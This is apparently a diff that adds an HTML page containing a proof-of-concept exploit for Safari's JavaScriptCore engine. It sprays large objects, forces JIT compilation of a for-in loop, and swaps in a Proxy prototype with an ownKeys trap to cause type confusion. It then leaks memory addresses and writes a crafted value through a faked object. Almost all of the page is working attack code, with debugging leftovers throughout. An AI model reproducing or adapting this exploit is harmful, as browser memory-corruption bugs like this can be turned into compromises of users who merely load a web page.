@@ -1,0 +1,155 @@
+<html>
+<head>
+<script src="/utils.js"></script>
+<script src="int64.js"></script>
+</head>
+<body>
+<script>
+
+// https://webkit.org/blog/8921/release-notes-for-safari-technology-preview-82/
+
+function r_str(l){
+    let random_string = '';
+    let random_ascii;
+    for(let i = 0; i < l; i++) {
+        random_ascii = Math.floor((Math.random() * 25) + 97);
+        random_string += String.fromCharCode(random_ascii)
+    }
+    return random_string
+}
+
+var o;
+var o2, o3;
+
+function obj_with_size(n){
+
+    let s = 'var obj = {';
+    for (let y = 0; y < n; y++){
+        s += 'a' + y + ':' + '"a"' + ',';
+    }
+    s += '}'
+    eval(s);
+    return obj;
+    
+}
+
+/*
+var v = new ArrayBuffer(0x200);
+
+//var sa = new Float64Array(0x30000*8);
+var sa = new ArrayBuffer(0x30000*8);
+
+for ( let y = 0; y < 0x30000*1; y++){
+    let cp = new Float64Array(0x2000);
+    cp.fill(3.5993841828739e-310);
+    cp[r_str(12)] = 'a';
+    sa[y] = cp;
+    
+}
+
+*/
+alert(1);
+
+function obj_with_ab(n){
+
+    let s = 'var obj = {';
+    for (let y = 0; y < n; y++){
+        s += 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + y + ':' +y + ',';
+    }
+    s += '}'
+    eval(s);
+    return obj;
+    
+}
+
+
+//o2 = obj_with_size(48600);
+//o3 = obj_with_size(48600);
+o2 = obj_with_ab(48600);
+o3 = obj_with_ab(48600);
+//let aa = 'a0';
+//let leakme = [1,2,3];
+
+//o = {a0:new ArrayBuffer(0x8000),a1:new ArrayBuffer(0x8000),a2:new ArrayBuffer(0x8000),a3:
+ //   new ArrayBuffer(0x8000)
+//};
+//o[aa] = 0;
+o = obj_with_ab(4);
+
+//aa.toString = function(){return sa;}
+
+function opt(tmp,flag) {
+            
+    function f(a) {
+        if (flag){
+            //gc();
+            //return {'r':0,'d':1,'l':2,'u':3,'f':4};
+        }
+        return a;
+    }
+        
+    let p = new Proxy(tmp,{ownKeys:f});
+    o2.__proto__ = p;
+    let g = 0;
+    let c = 0;
+    let q = null;
+
+    for (let x in o2) {
+    
+        if (flag) {
+        
+            //gc();
+             
+            c++;
+            print(c) 
+            
+            //if ( g == 1 ){return x;}
+                       
+            // we don't want to refarance this
+            // object twice if its a fake_object.
+            // because jsc would crash..
+            // so save this into a string.
+            //print(describe(x));
+            if ( g == 1) { return x;}            
+            let s = typeof x;
+            print(s);
+
+                        
+            if ( s == 'object' ){
+                g = 1;
+                //print(x[0]);
+            } else {
+                if ( typeof x == 'string' ){}
+                else {
+                  print('here');
+                  print('typeof x:' + typeof x);                 
+                  print('leaked memory: '+ Int64.fromDouble(x));
+                  return; 
+                }
+            }
+        } else { 
+          // optimize access ..
+          //o2[x] = 3.54484805889626e-310;        
+        }
+        q = x;
+    }
+    return q;
+    
+}
+
+// Compile the functions
+for (let t = 0; t <200;t++){
+    opt(o3,false);
+}
+
+let fo = opt(o,true);
+print('a');
+fo[0] = 3.54484805889626e-310;
+
+
+//sa[89];
+
+
+</script>
+</body>
+</html>
